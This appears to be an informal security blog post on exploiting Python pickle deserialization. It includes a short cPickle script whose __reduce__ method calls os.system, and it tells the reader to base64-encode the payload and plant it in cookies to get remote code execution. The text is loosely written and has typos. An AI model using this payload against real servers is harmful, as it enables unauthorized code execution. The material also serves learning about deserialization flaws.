---
title: pickle serializatoin
published: 2024-06-24
description: 'some picle stuff with serializatoin in java /javascript'
image: './move.gif'
tags: [serialization,exploit]
category: 'serialization'
draft: false
---

pickle shit is basically a python / could as well be js i guess , it helps serialize and reserialize objects , you can check js files or decode files to identify the pickle format which is usually something like that:
```json
	Hack
(dp1
S'test1'
p2
S'test'
p3
sS'test2'
p4
S'retest'
p5
sb.
```

+ one thing to pay attention to is that , to pickle you payload and get the shell or the RCE we are after you need to pickle on the same platform as the server runs at , win/unix .
+ so to create a milecious object just use the script :
```python
import cPickle
import os
class Blah(object):
  def __reduce__(self):
    return (os.system,("command to run ",)) 
h = Blah()
print cPickle.dumps(h)
```
now all you need is execute this and encode it as base64 and put in where it shall be exploited like in cookies for example.
+ you can use You can bypass the limitation of platform by using subprocess with \_\_import\_\_
+  finding what is managed by the application/framework natively (the session mechanism) and what has been added by the developer is the KEY.
+ 

